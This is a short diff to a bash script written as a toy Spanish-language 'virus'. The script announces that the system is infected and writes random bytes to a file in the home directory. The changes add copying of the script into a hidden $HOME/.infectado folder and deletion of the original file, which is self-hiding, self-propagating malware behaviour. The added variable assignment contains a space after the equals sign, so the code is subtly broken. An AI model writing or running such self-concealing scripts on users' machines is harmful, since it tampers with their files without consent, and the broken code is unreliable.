@@ -6,7 +6,11 @@ echo "¡Tu sistema está infectado! 😈"
 dd if=/dev/urandom of=$HOME/infectado.txt bs=512 count=1
 
 ## propagacion
-mkdir $HOME/.infectado
-cp $(realpath "$0") $HOME/.infectado
+HIDDEN= "$HOME/.infectado"
+mkdir $HIDDEN
+cp $(realpath "$0") $HIDDEN
 
-
+## destruccion
+if [ $(realpath "$0") != "$HIDDEN/gnomed.bash" ]; then
+rm -- ${0}
+fi
